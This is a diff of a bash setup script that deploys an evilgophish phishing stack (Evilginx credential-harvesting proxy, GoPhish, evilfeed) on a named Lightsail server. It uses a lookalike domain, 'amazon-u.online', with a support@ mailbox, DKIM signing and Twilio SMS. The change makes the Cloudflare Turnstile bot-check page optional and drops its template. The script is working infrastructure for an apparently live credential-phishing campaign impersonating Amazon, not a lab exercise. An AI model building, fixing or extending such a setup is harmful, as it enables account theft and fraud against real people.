@@ -1,6 +1,6 @@
 #!/bin/bash
 # setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
-# Changes: Domain updated to amazon-u.online; validates src/evilginx,gophish,evilfeed.
+# Changes: Domain amazon-u.online; Turnstile optional; validates src/evilginx,gophish,evilfeed.
 # SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
 # Fixes: Ensures mailconfig/postfix-main.cf; retries DKIM generation.
 # Usage: ./setup.sh [DOMAIN] [SUBDOMAINS] [PROXY_ROOT] [FEED_ENABLED] [RID_REPLACEMENT] [TWILIO_SID] [TWILIO_TOKEN] [TWILIO_PHONE] [TURNSTILE_PUBLIC] [TURNSTILE_PRIVATE] [SMTP_USER] [SMTP_PASS]
@@ -21,18 +21,16 @@ RID_REPLACEMENT="${5:-user_id}"
 TWILIO_SID="${6:-$(read -p "Twilio SID: " x; echo $x)}"
 TWILIO_TOKEN="${7:-$(read -s -p "Twilio Token: " x; echo $x)}"
 TWILIO_PHONE="${8:-$(read -p "Twilio Phone (+E.164): " x; echo $x)}"
-TURNSTILE_PUBLIC="${9:-$(read -p "Turnstile Public: " x; echo $x)}"
-TURNSTILE_PRIVATE="${10:-$(read -s -p "Turnstile Private: " x; echo $x)}"
+TURNSTILE_PUBLIC="${9:-$(read -p "Turnstile Public (optional, press Enter to skip): " x; echo $x)}"
+TURNSTILE_PRIVATE="${10:-$(read -p "Turnstile Private (optional, press Enter to skip): " x; echo $x)}"
 SMTP_USER="${11:-support@${DOMAIN}}"
 SMTP_PASS="${12:-$(read -s -p "SMTP Pass for ${SMTP_USER}: " x; echo $x)}"
 
-# Validate inputs
+# Validate required inputs
 [ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required"; exit 1; }
 [ -z "$TWILIO_SID" ] && { echo "Error: TWILIO_SID required"; exit 1; }
 [ -z "$TWILIO_TOKEN" ] && { echo "Error: TWILIO_TOKEN required"; exit 1; }
 [ -z "$TWILIO_PHONE" ] && { echo "Error: TWILIO_PHONE required"; exit 1; }
-[ -z "$TURNSTILE_PUBLIC" ] && { echo "Error: TURNSTILE_PUBLIC required"; exit 1; }
-[ -z "$TURNSTILE_PRIVATE" ] && { echo "Error: TURNSTILE_PRIVATE required"; exit 1; }
 
 # Dirs/Files
 mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./Uploads ./logs ./mailconfig
@@ -124,11 +122,7 @@ find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec cp {
 find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec sed -i "s/rid/${RID_REPLACEMENT}/g" {} \;
 cd ..
 
-# Templates
-cat > evilginx/templates/turnstile.html << 'EOF'
-<!DOCTYPE html><html><head><title>Security Check</title><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script><style>body{font-family:Arial;}</style></head><body><h1>Verify You're Human</h1><form action="{{.FormActionURL}}" method="POST"><div class="cf-turnstile" data-sitekey="{{.TurnstilePublicKey}}"></div>{{if .ErrorMessage}}<p style="color:red;">{{.ErrorMessage}}</p>{{end}}<button type="submit" name="button">Continue</button></form></body></html>
-EOF
-
+# Templates (only forbidden.html needed if no Turnstile)
 cat > evilginx/templates/forbidden.html << 'EOF'
 <!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>
 EOF
@@ -200,4 +194,4 @@ echo "Upload: cp file.csv uploads/; docker cp uploads/file.csv gophish:/app/uplo
 echo "Test SMTP: docker exec mailserver swaks -tls -au $SMTP_USER -ap '$SMTP_PASS' --from $SMTP_USER --to your@email.com --server localhost:587 -body 'Test'"
 echo "DNS: Configure Lightsail (see README); GoDaddy NS to Lightsail."
 echo "Clean: docker compose down -v; sudo mv /etc/hosts.bak /etc/hosts"
-echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN"
+echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx"
